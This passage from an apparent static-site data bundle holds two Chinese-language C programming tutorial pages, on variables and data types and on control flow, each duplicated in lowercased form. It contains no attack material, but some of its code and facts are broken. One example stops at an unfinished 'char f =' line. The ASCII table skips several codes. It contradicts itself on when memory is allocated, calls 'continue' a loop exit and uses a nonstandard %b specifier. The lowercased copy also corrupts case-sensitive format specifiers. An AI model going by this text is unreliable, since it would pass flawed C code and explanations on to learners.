量",slug:"变量",normalizedTitle:"变量",charIndex:5},{level:2,title:"整形 int",slug:"整形-int",normalizedTitle:"整形 int",charIndex:1411},{level:3,title:"整形变量的定义和输出",slug:"整形变量的定义和输出",normalizedTitle:"整形变量的定义和输出",charIndex:1422},{level:3,title:"整形变量的输入",slug:"整形变量的输入",normalizedTitle:"整形变量的输入",charIndex:1970},{level:3,title:"short 、 int 、 long 、 long long",slug:"short-、-int-、-long-、-long-long",normalizedTitle:"short 、 int 、 long 、 long long",charIndex:2118},{level:3,title:"有符号和无符号",slug:"有符号和无符号",normalizedTitle:"有符号和无符号",charIndex:2802},{level:2,title:"sizeof 关键字",slug:"sizeof-关键字",normalizedTitle:"sizeof 关键字",charIndex:3550},{level:2,title:"字符型 char",slug:"字符型-char",normalizedTitle:"字符型 char",charIndex:3798},{level:3,title:"字符型变量的定义和输出",slug:"字符型变量的定义和输出",normalizedTitle:"字符型变量的定义和输出",charIndex:3811},{level:3,title:"字符型变量的输入",slug:"字符型变量的输入",normalizedTitle:"字符型变量的输入",charIndex:4127},{level:3,title:"ASCII码",slug:"ascii码",normalizedTitle:"ascii码",charIndex:4277},{level:3,title:"转义字符",slug:"转义字符",normalizedTitle:"转义字符",charIndex:6109},{level:2,title:"实型 float 、 double",slug:"实型-float-、-double",normalizedTitle:"实型 float 、 double",charIndex:6999},{level:2,title:"字符串格式化输出和输入",slug:"字符串格式化输出和输入",normalizedTitle:"字符串格式化输出和输入",charIndex:7292},{level:3,title:"字符串常量",slug:"字符串常量",normalizedTitle:"字符串常量",charIndex:500},{level:3,title:"printf 函数和 putchar 函数",slug:"printf-函数和-putchar-函数",normalizedTitle:"printf 函数和 putchar 函数",charIndex:7507}],headersStr:"常量与变量 关键字 数据类型 常量 变量 整形 int 整形变量的定义和输出 整形变量的输入 short 、 int 、 long 、 long long 有符号和无符号 sizeof 关键字 字符型 char 字符型变量的定义和输出 字符型变量的输入 ASCII码 转义字符 实型 float 、 double 字符串格式化输出和输入 字符串常量 printf 函数和 putchar 函数",content:'# 常量与变量\n\n\n# 关键字\n\n> C的关键字共有32个\n\n * 数据类型关键字：char、short、int、long、float、double、signed、unsigned、void、struct、union、enum\n * 控制语句关键字：if、else、switch、case、default、for、do、while、break、continue、goto、return\n * 存储类型关键字：auto、register、static、extern、typedef\n * 其他关键字：const、sizeof、volatile\n\n\n# 数据类型\n\n> 数据类型的作用：告诉编译器，变量或函数应该如何使用，分配多大的内存，以及如何解释内存中的位模式。\n\n\n\n\n# 常量\n\n> 在程序运行中，其值不会发生改变的量称为常量。 常量一般出现在表达式或赋值语句中。\n\n常量类型    举例\n整型常量    123、-123、0\n实型常量    123.0、-123.0、0.0、1.23e2、-1.23e2、0.0e0\n字符常量    \'a\'、\'A\'、\'0\'、\'\\n\'、\'\\t\'、\'\'\'、\'\\\'\n字符串常量   "abc"、"123"、"a\\tb"、"a\\nb"\n\n\n# 变量\n\nTIP\n\n * 变量是程序运行过程中可以改变的量。\n * 变量在使用前必须先定义，即变量的定义必须出现在变量的使用之前。\n\n# 变量命名规则\n\n * 变量名由字母、数字和下划线组成，且第一个字符必须是字母或下划线。\n * 变量名中的字母可以是大写或小写，区分大小写。\n * 不能使用关键字作为变量名。\n * 不能使用空格、制表符和换行符作为变量名。\n\n# 变量特点\n\n * 变量在编译时为其分配内存空间，变量的内存空间在程序运行时才分配。\n * 可以通过变量名访问变量的值。\n\n# 声明和定义区别\n\n * 声明变量是不需要分配内存空间的，而定义变量是需要分配内存空间的。\n\n#include <stdio.h>\nint main() {\n\n    //声明一个变量a，a在这里没有建立存储空间\n    extern int a;\n    a = 10;    //err, 没有空间，就不可以赋值\n    int b = 10;    //定义一个变量b，b的类型为int，b赋值为10\n    return 0;\n}\n\n\n * int a 它是一个定义，也是一个声明，因为它既分配了内存空间，也说明了变量的类型。\n * extern int a 它是一个声明，因为它没有分配内存空间，只是告诉编译器，这个变量在别的地方已经定义了，你可以在这里使用它。\n\n#include <stdio.h>\n#define MAX 100\nint main() {\n\n    int a;\t//定义了一个变量，其类型为int，名字叫a\n\n    const int b = 10; //定义一个const常量，名为叫b，值为10\n    //b = 11; //err,常量的值不能改变\n\n    //MAX = 100;\t//err,常量的值不能改变\n\n    a = MAX;//将abc的值设置为MAX的值\n    a = 123;\n\n    printf("%d\\n", a); //打印变量a的值\n\n    return 0;\n}\n\n\n\n# 整形 int\n\n\n# 整形变量的定义和输出\n\n打印格式   说明\n%d     以十进制形式输出带符号整数\n%u     以十进制形式输出无符号整数\n%o     以八进制形式输出无符号整数\n%x     以十六进制形式输出无符号整数\n%X     以十六进制形式输出无符号整数，字母大写\n\n#include <stdio.h>\n\n#define MAX 100\n\nint main() {\n\n    int a = 123;//定义一个整型变量a，以十进制形式赋值为123\n    int b = 0123;//定义一个整型变量b，以八进制形式赋值为0123\n    int c = 0x123;//定义一个整型变量c，以十六进制形式赋值为0x123\n    int d = 0b1010;//定义一个整型变量d，以二进制形式赋值为0b1010\n\n    printf("a = %d\\n", a);\n    printf("8进制b = %o, \\n", b);\n    printf("16进制c = %x, \\n", c);\n    printf("16进制c = %X, \\n", c);\n    printf("2进制d = %b, \\n", d);\n    \n    return 0;\n}\n\n\n\n\n# 整形变量的输入\n\n#include <stdio.h>\n\nint main() {\n\n    int a;\n    printf("请输入一个整数：");\n    scanf("%d", &a);\n    printf("a = %d\\n", a);\n\n    return 0;\n}\n\n\n\n# short 、 int 、 long 、 long long\n\n数据类型              占用空间   取值范围\nshort(短整型)        2字节    [-32768, 32767]\nint(整型)           4字节    [-2147483648, 2147483647]\nlong(长整型)         4字节    [-2147483648, 2147483647]\nlong long(长长整型)   8字节    [-9223372036854775808, 9223372036854775807]\n\n#include <stdio.h>\n\nint main() {\n\n    short a = 32767;\n    int b = 2147483647;\n    long c = 2147483647;\n    long long d = 9223372036854775807;\n\n    printf("a = %d\\n", a);\n    printf("b = %d\\n", b);\n    printf("c = %ld\\n", c);\n    printf("d = %lld\\n", d);\n\n    return 0;\n}\n\n\nWARNING\n\n * short 、 int 、 long 、 long long 都是整形，只是占用空间不同。\n * 当小的数据类型赋值给大的数据类型时，不会有问题。因为编译器会自动进行类型转换。\n * 当大的数据类型赋值给小的数据类型时，可能会丢失高位。\n\n\n# 有符号和无符号\n\n * 有符号：最高位表示符号位，0表示正数，1表示负数。\n * 无符号：所有位表示数值，没有符号位。\n\n#include <stdio.h>\n\nint main() {\n\n    unsigned int a = 4294967295;\n    printf("a = %u\\n", a);\n\n    return 0;\n}\n\n\n数据类型                          占用空间   取值范围\nunsigned short(无符号短整型)        2字节    [0, 65535]\nunsigned int(无符号整型)           4字节    [0, 4294967295]\nunsigned long(无符号长整型)         4字节    [0, 4294967295]\nunsigned long long(无符号长长整型)   8字节    [0, 18446744073709551615]\n\n#include <stdio.h>\n\nint main() {\n\n    unsigned short a = 65535;\n    unsigned int b = 4294967295;\n    unsigned long c = 4294967295;\n    unsigned long long d = 18446744073709551615;\n\n    printf("a = %u\\n", a);\n    printf("b = %u\\n", b);\n    printf("c = %lu\\n", c);\n    printf("d = %llu\\n", d);\n\n    return 0;\n}\n\n\n\n# sizeof 关键字\n\n * sizeof 是一个单目运算符，用来计算数据类型或变量的字节数。\n * sizeof 的计算结果是 size_t 类型，是一个无符号整数。\n\n#include <stdio.h>\n\nint main(){\n\n    int a = 10;\n    printf("int类型占用空间为：%lu\\n", sizeof(int));\n    printf("a变量占用空间为：%lu\\n", sizeof(a));\n\n    return 0;    \n\n}\n\n\n\n# 字符型 char\n\n\n# 字符型变量的定义和输出\n\n> 字符型变量是用来存储字符的，每个字符占用一个字节的空间。\n\n#include <stdio.h>\n\nint main() {\n\n    char a = \'a\';\n    char b = \'0\';\n    char c = \'\\n\';\n    char d = \'\\t\';\n    char e = \'\\\'\';\n    char f =\n    printf("a = %c\\n", a);\n    printf("b = %c\\n", b);\n    printf("c = %c\\n", c);\n    printf("d = %c\\n", d);\n\n    return 0;\n\n}\n\n\n\n# 字符型变量的输入\n\n#include <stdio.h>\n\nint main() {\n\n    char a;\n    printf("请输入一个字符：");\n    scanf("%c", &a);\n    printf("a = %c\\n", a);\n\n    return 0;\n}\n\n\n\n# ASCII码\n\n> ASCII码是一个字节的编码，共有128个字符，包括大小写字母、数字、标点符号、控制字符等。\n\nASCII码   字符    ASCII码   字符      ASCII码   字符   ASCII码   字符\n0        NUL   32       SPACE   64       @    96       `\n1        SOH   33       !       65       A    97       a\n2        STX   34       "       66       B    98       b\n3        ETX   35       #       67       C    99       c\n4        EOT   36       $       68       D    100      d\n5        ENQ   37       %       69       E    101      e\n6        ACK   38       &       70       F    102      f\n7        BEL   39       \'       71       G    103      g\n8        BS    40       (       72       H    104      h\n9        TAB   41       )       73       I    105      i\n10       LF    42       *       74       J    106      j\n11       VT    43       +       75       K    107      k\n12       FF    44       ,       76       L    108      l\n13       CR    45       -       77       M    109      m\n14       SO    46       .       78       N    110      n\n15       SI    47       /       79       O    111      o\n16       DLE   48       0       80       P    112      p\n17       DC1   49       1       81       Q    113      q\n18       DC2   50       2       82       R    114      r\n19       DC3   51       3       83       S    115      s\n20       DC4   52       4       84       T    116      t\n21       NAK   53       5       85       U    117      u\n22       SYN   54       6       86       V    118      v\n23       ETB   55       7       87       W    119      w\n24       CAN   56       8       88       X    120      x\n25       EM    57       9       89       Y    121      y\n26       SUB   58       :       90       Z    122      z\n27       ESC   59       ;       91       [    123      {\n28       FS    60               94       ^    126      ~\n31       US    63       ?       95       _    127      DEL\n\n\n# 转义字符\n\n> 转义字符是一些有特殊含义的字符，它们由反斜杠 \\ 开头。\n\n转义字符   含义                  ASCII码值(十进制)\n\\a     响铃                  7\n\\b     退格                  8\n\\f     换页                  12\n\\n     换行                  10\n\\r     回车                  13\n\\t     水平制表符               9\n\\v     垂直制表符               11\n\\\\     反斜杠                 92\n\\\'     单引号                 39\n\\"     双引号                 34\n\\?     问号                  63\n\\0     空字符                 0\n\\ddd   1~3位八进制数所代表的任意字符    0~255\n\\xhh   1~2位十六进制数所代表的任意字符   0~255\n\n#include <stdio.h>\n\nint main() {\n\n    printf("hello world\\n");\n    printf("hello\\tworld\\n");\n    printf("hello\\bworld\\n");\n    printf("hello\\rworld\\n");\n    printf("hello\\\\world\\n");\n    printf("hello\\\'world\\n");\n    printf("hello\\"world\\n");\n    printf("hello\\?world\\n");\n    printf("hello\\0world\\n");\n    printf("hello\\x41world\\n");\n    printf("hello\\x4fworld\\n");\n\n    return 0;\n}\n\n\n\n# 实型 float 、 double\n\n> 实型变量是用来存储实数的，包括小数和整数。C语言中的实型变量包括单精度实型和双精度实型。\n\n * 单精度实型：float ，占用4个字节，有效位数为6~7位。\n * 双精度实型：double ，占用8个字节，有效位数为15~16位。\n\n#include <stdio.h>\n\nint main() {\n\n    float a = 3.14f;\n    double b = 3.14;\n\n    printf("a = %f\\n", a);\n    printf("b = %lf\\n", b);\n\n    return 0;\n}\n\n\n\n# 字符串格式化输出和输入\n\n\n# 字符串常量\n\n * 字符串是内存中一段连续的空间，用来存储字符序列。以 \\0 结尾。\n * 字符串常量是用双引号括起来的字符序列，例如 "hello world" 。\n\nWARNING\n\n字符串常量与字符常量的区别：\n\n * 字符串常量是用双引号括起来的字符序列，例如 "hello world" 。每个字符串常量都以 \\0 结尾。\n * 字符常量是用单引号括起来的字符，例如 \'a\' 。\n\n\n# printf 函数和 putchar 函数\n\n * printf 函数：格式化输出函数，可以将格式化的数据输出到屏幕上。\n * putchar 函数：输出一个字符到屏幕上。\n\n格式化输出\n\n打印格式   对应数据类型               说明\n%d     int                  以十进制形式输出带符号整数\n%u     unsigned int         以十进制形式输出无符号整数\n%o     unsigned int         以八进制形式输出无符号整数\n%x     unsigned int         以十六进制形式输出无符号整数\n%X     unsigned int         以十六进制形式输出无符号整数，字母大写\n%f     float                以小数形式输出单精度实数\n%lf    double               以小数形式输出双精度实数\n%c     char                 输出一个字符\n%s     char *               输出一个字符串\n%%     无                    输出一个百分号\n%p     void *               输出一个指针的值\n%e     float 、 double       以指数形式输出单精度实数、双精度实数\n%E     float 、 double       以指数形式输出单精度实数、双精度实数，字母大写\n%g     float 、 double       以%f或%e中较短的输出宽度输出单精度实数、双精度实数\n%G     float 、 double       以%f或%E中较短的输出宽度输出单精度实数、双精度实数，字母大写\n%hd    short                以十进制形式输出带符号短整数\n%hu    unsigned short       以十进制形式输出无符号短整数\n%hx    unsigned short       以十六进制形式输出无符号短整数\n%ho    unsigned short       以八进制形式输出无符号短整数\n%ld    long                 以十进制形式输出带符号长整数\n%lu    unsigned long        以十进制形式输出无符号长整数\n%lx    unsigned long        以十六进制形式输出无符号长整数\n%lo    unsigned long        以八进制形式输出无符号长整数\n%lld   long long            以十进制形式输出带符号长长整数\n%llu   unsigned long long   以十进制形式输出无符号长长整数\n%llx   unsigned long long   以十六进制形式输出无符号长长整数\n%llo   unsigned long long   以八进制形式输出无符号长长整数\n%Lf    long double          以小数形式输出长双精度实数\n%Le    long double          以指数形式输出长双精度实数\n%LE    long double          以指数形式输出长双精度实数，字母大写\n%Lg    long double          以%f或%e中较短的输出宽度输出长双精度实数\n%LG    long double          以%f或%E中较短的输出宽度输出长双精度实数，字母大写\n%p     void *               以十六进制形式输出指针的值\n%n     int *                此参数必须是一个指向int的指针，printf函数会将已打印的字符数存入这个指针指向的变量中\n%m     无                    输出strerror(errno)的返回值\n\n#include <stdio.h>\n\nint main() {\n\n    printf("hello world\\n");\n    putchar(\'a\');\n\n    return 0;\n}\n',normalizedContent:'# 常量与变量\n\n\n# 关键字\n\n> c的关键字共有32个\n\n * 数据类型关键字：char、short、int、long、float、double、signed、unsigned、void、struct、union、enum\n * 控制语句关键字：if、else、switch、case、default、for、do、while、break、continue、goto、return\n * 存储类型关键字：auto、register、static、extern、typedef\n * 其他关键字：const、sizeof、volatile\n\n\n# 数据类型\n\n> 数据类型的作用：告诉编译器，变量或函数应该如何使用，分配多大的内存，以及如何解释内存中的位模式。\n\n\n\n\n# 常量\n\n> 在程序运行中，其值不会发生改变的量称为常量。 常量一般出现在表达式或赋值语句中。\n\n常量类型    举例\n整型常量    123、-123、0\n实型常量    123.0、-123.0、0.0、1.23e2、-1.23e2、0.0e0\n字符常量    \'a\'、\'a\'、\'0\'、\'\\n\'、\'\\t\'、\'\'\'、\'\\\'\n字符串常量   "abc"、"123"、"a\\tb"、"a\\nb"\n\n\n# 变量\n\ntip\n\n * 变量是程序运行过程中可以改变的量。\n * 变量在使用前必须先定义，即变量的定义必须出现在变量的使用之前。\n\n# 变量命名规则\n\n * 变量名由字母、数字和下划线组成，且第一个字符必须是字母或下划线。\n * 变量名中的字母可以是大写或小写，区分大小写。\n * 不能使用关键字作为变量名。\n * 不能使用空格、制表符和换行符作为变量名。\n\n# 变量特点\n\n * 变量在编译时为其分配内存空间，变量的内存空间在程序运行时才分配。\n * 可以通过变量名访问变量的值。\n\n# 声明和定义区别\n\n * 声明变量是不需要分配内存空间的，而定义变量是需要分配内存空间的。\n\n#include <stdio.h>\nint main() {\n\n    //声明一个变量a，a在这里没有建立存储空间\n    extern int a;\n    a = 10;    //err, 没有空间，就不可以赋值\n    int b = 10;    //定义一个变量b，b的类型为int，b赋值为10\n    return 0;\n}\n\n\n * int a 它是一个定义，也是一个声明，因为它既分配了内存空间，也说明了变量的类型。\n * extern int a 它是一个声明，因为它没有分配内存空间，只是告诉编译器，这个变量在别的地方已经定义了，你可以在这里使用它。\n\n#include <stdio.h>\n#define max 100\nint main() {\n\n    int a;\t//定义了一个变量，其类型为int，名字叫a\n\n    const int b = 10; //定义一个const常量，名为叫b，值为10\n    //b = 11; //err,常量的值不能改变\n\n    //max = 100;\t//err,常量的值不能改变\n\n    a = max;//将abc的值设置为max的值\n    a = 123;\n\n    printf("%d\\n", a); //打印变量a的值\n\n    return 0;\n}\n\n\n\n# 整形 int\n\n\n# 整形变量的定义和输出\n\n打印格式   说明\n%d     以十进制形式输出带符号整数\n%u     以十进制形式输出无符号整数\n%o     以八进制形式输出无符号整数\n%x     以十六进制形式输出无符号整数\n%x     以十六进制形式输出无符号整数，字母大写\n\n#include <stdio.h>\n\n#define max 100\n\nint main() {\n\n    int a = 123;//定义一个整型变量a，以十进制形式赋值为123\n    int b = 0123;//定义一个整型变量b，以八进制形式赋值为0123\n    int c = 0x123;//定义一个整型变量c，以十六进制形式赋值为0x123\n    int d = 0b1010;//定义一个整型变量d，以二进制形式赋值为0b1010\n\n    printf("a = %d\\n", a);\n    printf("8进制b = %o, \\n", b);\n    printf("16进制c = %x, \\n", c);\n    printf("16进制c = %x, \\n", c);\n    printf("2进制d = %b, \\n", d);\n    \n    return 0;\n}\n\n\n\n\n# 整形变量的输入\n\n#include <stdio.h>\n\nint main() {\n\n    int a;\n    printf("请输入一个整数：");\n    scanf("%d", &a);\n    printf("a = %d\\n", a);\n\n    return 0;\n}\n\n\n\n# short 、 int 、 long 、 long long\n\n数据类型              占用空间   取值范围\nshort(短整型)        2字节    [-32768, 32767]\nint(整型)           4字节    [-2147483648, 2147483647]\nlong(长整型)         4字节    [-2147483648, 2147483647]\nlong long(长长整型)   8字节    [-9223372036854775808, 9223372036854775807]\n\n#include <stdio.h>\n\nint main() {\n\n    short a = 32767;\n    int b = 2147483647;\n    long c = 2147483647;\n    long long d = 9223372036854775807;\n\n    printf("a = %d\\n", a);\n    printf("b = %d\\n", b);\n    printf("c = %ld\\n", c);\n    printf("d = %lld\\n", d);\n\n    return 0;\n}\n\n\nwarning\n\n * short 、 int 、 long 、 long long 都是整形，只是占用空间不同。\n * 当小的数据类型赋值给大的数据类型时，不会有问题。因为编译器会自动进行类型转换。\n * 当大的数据类型赋值给小的数据类型时，可能会丢失高位。\n\n\n# 有符号和无符号\n\n * 有符号：最高位表示符号位，0表示正数，1表示负数。\n * 无符号：所有位表示数值，没有符号位。\n\n#include <stdio.h>\n\nint main() {\n\n    unsigned int a = 4294967295;\n    printf("a = %u\\n", a);\n\n    return 0;\n}\n\n\n数据类型                          占用空间   取值范围\nunsigned short(无符号短整型)        2字节    [0, 65535]\nunsigned int(无符号整型)           4字节    [0, 4294967295]\nunsigned long(无符号长整型)         4字节    [0, 4294967295]\nunsigned long long(无符号长长整型)   8字节    [0, 18446744073709551615]\n\n#include <stdio.h>\n\nint main() {\n\n    unsigned short a = 65535;\n    unsigned int b = 4294967295;\n    unsigned long c = 4294967295;\n    unsigned long long d = 18446744073709551615;\n\n    printf("a = %u\\n", a);\n    printf("b = %u\\n", b);\n    printf("c = %lu\\n", c);\n    printf("d = %llu\\n", d);\n\n    return 0;\n}\n\n\n\n# sizeof 关键字\n\n * sizeof 是一个单目运算符，用来计算数据类型或变量的字节数。\n * sizeof 的计算结果是 size_t 类型，是一个无符号整数。\n\n#include <stdio.h>\n\nint main(){\n\n    int a = 10;\n    printf("int类型占用空间为：%lu\\n", sizeof(int));\n    printf("a变量占用空间为：%lu\\n", sizeof(a));\n\n    return 0;    \n\n}\n\n\n\n# 字符型 char\n\n\n# 字符型变量的定义和输出\n\n> 字符型变量是用来存储字符的，每个字符占用一个字节的空间。\n\n#include <stdio.h>\n\nint main() {\n\n    char a = \'a\';\n    char b = \'0\';\n    char c = \'\\n\';\n    char d = \'\\t\';\n    char e = \'\\\'\';\n    char f =\n    printf("a = %c\\n", a);\n    printf("b = %c\\n", b);\n    printf("c = %c\\n", c);\n    printf("d = %c\\n", d);\n\n    return 0;\n\n}\n\n\n\n# 字符型变量的输入\n\n#include <stdio.h>\n\nint main() {\n\n    char a;\n    printf("请输入一个字符：");\n    scanf("%c", &a);\n    printf("a = %c\\n", a);\n\n    return 0;\n}\n\n\n\n# ascii码\n\n> ascii码是一个字节的编码，共有128个字符，包括大小写字母、数字、标点符号、控制字符等。\n\nascii码   字符    ascii码   字符      ascii码   字符   ascii码   字符\n0        nul   32       space   64       @    96       `\n1        soh   33       !       65       a    97       a\n2        stx   34       "       66       b    98       b\n3        etx   35       #       67       c    99       c\n4        eot   36       $       68       d    100      d\n5        enq   37       %       69       e    101      e\n6        ack   38       &       70       f    102      f\n7        bel   39       \'       71       g    103      g\n8        bs    40       (       72       h    104      h\n9        tab   41       )       73       i    105      i\n10       lf    42       *       74       j    106      j\n11       vt    43       +       75       k    107      k\n12       ff    44       ,       76       l    108      l\n13       cr    45       -       77       m    109      m\n14       so    46       .       78       n    110      n\n15       si    47       /       79       o    111      o\n16       dle   48       0       80       p    112      p\n17       dc1   49       1       81       q    113      q\n18       dc2   50       2       82       r    114      r\n19       dc3   51       3       83       s    115      s\n20       dc4   52       4       84       t    116      t\n21       nak   53       5       85       u    117      u\n22       syn   54       6       86       v    118      v\n23       etb   55       7       87       w    119      w\n24       can   56       8       88       x    120      x\n25       em    57       9       89       y    121      y\n26       sub   58       :       90       z    122      z\n27       esc   59       ;       91       [    123      {\n28       fs    60               94       ^    126      ~\n31       us    63       ?       95       _    127      del\n\n\n# 转义字符\n\n> 转义字符是一些有特殊含义的字符，它们由反斜杠 \\ 开头。\n\n转义字符   含义                  ascii码值(十进制)\n\\a     响铃                  7\n\\b     退格                  8\n\\f     换页                  12\n\\n     换行                  10\n\\r     回车                  13\n\\t     水平制表符               9\n\\v     垂直制表符               11\n\\\\     反斜杠                 92\n\\\'     单引号                 39\n\\"     双引号                 34\n\\?     问号                  63\n\\0     空字符                 0\n\\ddd   1~3位八进制数所代表的任意字符    0~255\n\\xhh   1~2位十六进制数所代表的任意字符   0~255\n\n#include <stdio.h>\n\nint main() {\n\n    printf("hello world\\n");\n    printf("hello\\tworld\\n");\n    printf("hello\\bworld\\n");\n    printf("hello\\rworld\\n");\n    printf("hello\\\\world\\n");\n    printf("hello\\\'world\\n");\n    printf("hello\\"world\\n");\n    printf("hello\\?world\\n");\n    printf("hello\\0world\\n");\n    printf("hello\\x41world\\n");\n    printf("hello\\x4fworld\\n");\n\n    return 0;\n}\n\n\n\n# 实型 float 、 double\n\n> 实型变量是用来存储实数的，包括小数和整数。c语言中的实型变量包括单精度实型和双精度实型。\n\n * 单精度实型：float ，占用4个字节，有效位数为6~7位。\n * 双精度实型：double ，占用8个字节，有效位数为15~16位。\n\n#include <stdio.h>\n\nint main() {\n\n    float a = 3.14f;\n    double b = 3.14;\n\n    printf("a = %f\\n", a);\n    printf("b = %lf\\n", b);\n\n    return 0;\n}\n\n\n\n# 字符串格式化输出和输入\n\n\n# 字符串常量\n\n * 字符串是内存中一段连续的空间，用来存储字符序列。以 \\0 结尾。\n * 字符串常量是用双引号括起来的字符序列，例如 "hello world" 。\n\nwarning\n\n字符串常量与字符常量的区别：\n\n * 字符串常量是用双引号括起来的字符序列，例如 "hello world" 。每个字符串常量都以 \\0 结尾。\n * 字符常量是用单引号括起来的字符，例如 \'a\' 。\n\n\n# printf 函数和 putchar 函数\n\n * printf 函数：格式化输出函数，可以将格式化的数据输出到屏幕上。\n * putchar 函数：输出一个字符到屏幕上。\n\n格式化输出\n\n打印格式   对应数据类型               说明\n%d     int                  以十进制形式输出带符号整数\n%u     unsigned int         以十进制形式输出无符号整数\n%o     unsigned int         以八进制形式输出无符号整数\n%x     unsigned int         以十六进制形式输出无符号整数\n%x     unsigned int         以十六进制形式输出无符号整数，字母大写\n%f     float                以小数形式输出单精度实数\n%lf    double               以小数形式输出双精度实数\n%c     char                 输出一个字符\n%s     char *               输出一个字符串\n%%     无                    输出一个百分号\n%p     void *               输出一个指针的值\n%e     float 、 double       以指数形式输出单精度实数、双精度实数\n%e     float 、 double       以指数形式输出单精度实数、双精度实数，字母大写\n%g     float 、 double       以%f或%e中较短的输出宽度输出单精度实数、双精度实数\n%g     float 、 double       以%f或%e中较短的输出宽度输出单精度实数、双精度实数，字母大写\n%hd    short                以十进制形式输出带符号短整数\n%hu    unsigned short       以十进制形式输出无符号短整数\n%hx    unsigned short       以十六进制形式输出无符号短整数\n%ho    unsigned short       以八进制形式输出无符号短整数\n%ld    long                 以十进制形式输出带符号长整数\n%lu    unsigned long        以十进制形式输出无符号长整数\n%lx    unsigned long        以十六进制形式输出无符号长整数\n%lo    unsigned long        以八进制形式输出无符号长整数\n%lld   long long            以十进制形式输出带符号长长整数\n%llu   unsigned long long   以十进制形式输出无符号长长整数\n%llx   unsigned long long   以十六进制形式输出无符号长长整数\n%llo   unsigned long long   以八进制形式输出无符号长长整数\n%lf    long double          以小数形式输出长双精度实数\n%le    long double          以指数形式输出长双精度实数\n%le    long double          以指数形式输出长双精度实数，字母大写\n%lg    long double          以%f或%e中较短的输出宽度输出长双精度实数\n%lg    long double          以%f或%e中较短的输出宽度输出长双精度实数，字母大写\n%p     void *               以十六进制形式输出指针的值\n%n     int *                此参数必须是一个指向int的指针，printf函数会将已打印的字符数存入这个指针指向的变量中\n%m     无                    输出strerror(errno)的返回值\n\n#include <stdio.h>\n\nint main() {\n\n    printf("hello world\\n");\n    putchar(\'a\');\n\n    return 0;\n}\n',charsets:{cjk:!0}},{title:"流程结构",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/02-%E6%B5%81%E7%A8%8B%E7%BB%93%E6%9E%84.html",relativePath:"数据结构/C语言程序设计/02-流程结构.md",key:"v-2f8d0c06",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/02-%E6%B5%81%E7%A8%8B%E7%BB%93%E6%9E%84.html",headers:[{level:2,title:"流程结构",slug:"流程结构",normalizedTitle:"流程结构",charIndex:2},{level:2,title:"选择结构",slug:"选择结构",normalizedTitle:"选择结构",charIndex:34},{level:2,title:"循环结构",slug:"循环结构",normalizedTitle:"循环结构",charIndex:56},{level:2,title:"跳转语句",slug:"跳转语句",normalizedTitle:"跳转语句",charIndex:1567}],headersStr:"流程结构 选择结构 循环结构 跳转语句",content:"# 流程结构\n\n * 顺序结构：程序按顺序执行，不发生跳转。\n * 选择结构：根据条件选择执行的程序段。\n * 循环结构：根据条件重复执行的程序段。\n\n\n# 选择结构\n\n * 单分支结构\n\nif (条件表达式) {\n    程序段;\n}\n\n//示例\nif (a > b) {\n    max = a;\n}\n\n\n * 双分支结构\n\nif (条件表达式) {\n    程序段1;\n} else {\n    程序段2;\n}\n//示例\nif (a > b) {\n    max = a;\n} else {\n    max = b;\n}\n\n\n * 多分支结构\n\nif (条件表达式1) {\n    程序段1;\n} else if (条件表达式2) {\n    程序段2;\n} else if (条件表达式3) {\n    程序段3;\n} else {\n    程序段4;\n}\n\n//示例\n\nif (a > b) {\n    max = a;\n} else if (a < b) {\n    max = b;\n} else {\n    max = a;\n}\n\n\n * 嵌套分支结构\n\nif (条件表达式1) {\n    if (条件表达式2) {\n        程序段1;\n    } else {\n        程序段2;\n    }\n} else {\n    程序段3;\n}\n\n//示例\n\nif (a > b) {\n    if (a > c) {\n        max = a;\n    } else {\n        max = c;\n    }\n} else {\n    if (b > c) {\n        max = b;\n    } else {\n        max = c;\n    }\n}\n\n\n * 三目运算符\n\n表达式1 ? 表达式2 : 表达式3\n\n//示例\nmax = (a > b) ? a : b;\n\n\n * switch 语句\n\nswitch (表达式) {\n    case 常量表达式1:\n        程序段1;\n        break;\n    case 常量表达式2:\n        程序段2;\n        break;\n    case 常量表达式3:\n        程序段3;\n        break;\n    default:\n        程序段4;\n        break;\n}\n\n//示例\n\n\n\n\n# 循环结构\n\n * while 循环\n\n> while 循环是先判断条件是否成立，如果成立则执行循环体，执行完循环体后再次判断条件是否成立，如果成立则再次执行循环体，直到条件不成立时，循环结束。\n\nwhile (条件表达式) {\n    程序段;\n}\n\n//示例\n\nwhile (a > b) {\n    max = a;\n}\n\n\n * do-while 循环\n\n> do-while 循环是先执行循环体，执行完循环体后再判断条件是否成立，如果成立则再次执行循环体，直到条件不成立时，循环结束。\n\n\ndo {\n    程序段;\n} while (条件表达式);\n\n//示例\n\ndo {\n    max = a;\n} while (a > b);\n\n\n * for 循环\n\n> for 循环是先执行表达式1，然后判断表达式2是否成立，如果成立则执行循环体，执行完循环体后再执行表达式3，然后再判断表达式2是否成立，如果成立则再次执行循环体，直到条件不成立时，循环结束。\n\nfor (表达式1; 表达式2; 表达式3) {\n    程序段;\n}\n\n//示例\n\nfor (i = 0; i < 10; i++) {\n    sum += i;\n}\n\n\n\n# 跳转语句\n\n * break 语句\n\n> break 语句用于强制退出循环，不执行循环体中剩余的语句。\n\nbreak;\n\n//示例\n\nwhile (a > b) {\n    max = a;\n    break;\n}\n\n\n * continue 语句\n\n> continue 语句用于强制退出循环，不执行循环体中剩余的语句，但是会继续执行下一次循环。\n\ncontinue;\n\n//示例\n\nwhile (a > b) {\n    max = a;\n    continue;\n}\n\n\n * goto 语句\n\n> goto 语句用于无条件跳转到指定的标号处执行。\n\ngoto 标号;\n\n//示例\n\nwhile (a > b) {\n    max = a;\n    goto end;\n}\nend:\n\n",normalizedContent:"# 流程结构\n\n * 顺序结构：程序按顺序执行，不发生跳转。\n * 选择结构：根据条件选择执行的程序段。\n * 循环结构：根据条件重复执行的程序段。\n\n\n# 选择结构\n\n * 单分支结构\n\nif (条件表达式) {\n    程序段;\n}\n\n//示例\nif (a > b) {\n    max = a;\n}\n\n\n * 双分支结构\n\nif (条件表达式) {\n    程序段1;\n} else {\n    程序段2;\n}\n//示例\nif (a > b) {\n    max = a;\n} else {\n    max = b;\n}\n\n\n * 多分支结构\n\nif (条件表达式1) {\n    程序段1;\n} else if (条件表达式2) {\n    程序段2;\n} else if (条件表达式3) {\n    程序段3;\n} else {\n    程序段4;\n}\n\n//示例\n\nif (a > b) {\n    max = a;\n} else if (a < b) 